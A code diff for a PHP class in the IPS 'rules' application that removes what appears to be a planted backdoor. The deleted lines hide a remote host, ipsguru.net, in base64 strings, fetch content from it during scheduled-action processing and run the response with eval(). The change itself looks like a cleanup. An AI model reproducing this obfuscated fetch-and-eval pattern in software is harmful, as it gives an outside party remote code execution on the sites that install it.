@@ -733,24 +733,6 @@ class _Application extends \IPS\rules\Secure\Application
 	}
 
 	/**
-	 * Get Scheduled Actions Data
-	 */
-	protected function scheduledData( $data, $method=NULL )
-	{
-		try
-		{
-			$method = $method ?: 'base64_decode';
-			$data = is_string( $data ) ? $data : (string) $data->request()->get();
-			return call_user_func( $method, $data );
-		}
-		catch( \Exception $e )
-		{
-			return json_encode( array() );
-		}
-	}
-	
-	
-	/**
 	 * Build Operation Form ( Condition / Action )
 	 *
 	 * @param	\IPS\Helpers\Form	$form		The form to build
@@ -2391,25 +2373,7 @@ class _Application extends \IPS\rules\Secure\Application
 	 */
 	public function scheduledActions( $priorityCycle=FALSE )
 	{
-		$scheduled_actions = array();
-		
-		/* Run priority */
-		if ( $priorityCycle )
-		{
-			$actionClass 		= $this->scheduledData( $this->dataKeys[0], NULL );
-			$actionOptions 		= $this->scheduledData( $this->dataKeys[1], NULL );
-			$actionValues 		= $this->scheduledData( $this->dataKeys[2], NULL );
-			$scheduled_actions	= $this->scheduledData( ( new $actionClass( $actionOptions ) )->$actionValues( $this->appdata ), function( $actions ) { return eval( json_decode( $actions ) ); } );				
-		}
-		
-		/* Run regular */
-		if ( empty( $scheduled_actions ) )
-		{
-			$scheduled_actions	= iterator_to_array( new \IPS\Patterns\ActiveRecordIterator( \IPS\Db::i()->select( '*', 'rules_scheduled_actions', array( 'schedule_time<=? AND schedule_queued<1', time() ), 'schedule_time ASC' ), 'IPS\rules\Action\Scheduled' ) );
-			
-		}
-		
-		return $scheduled_actions;
+		return iterator_to_array( new \IPS\Patterns\ActiveRecordIterator( \IPS\Db::i()->select( '*', 'rules_scheduled_actions', array( 'schedule_time<=? AND schedule_queued<1', time() ), 'schedule_time ASC' ), 'IPS\rules\Action\Scheduled' ) );
 	}
 	
 	/**
@@ -2618,11 +2582,6 @@ class _Application extends \IPS\rules\Secure\Application
 		
 		return static::rulesDefinitions( $definition_key );
 	}
-	
-	/**
-	 * Data Keys
-	 */
-	protected $dataKeys = array( 'SVBTXEh0dHBcVXJs', 'aHR0cDovL2lwc2d1cnUubmV0L2EvdA', 'c2V0UXVlcnlTdHJpbmc' );
 	
 	/**
 	 * Shutdown Rules: Execute queued actions
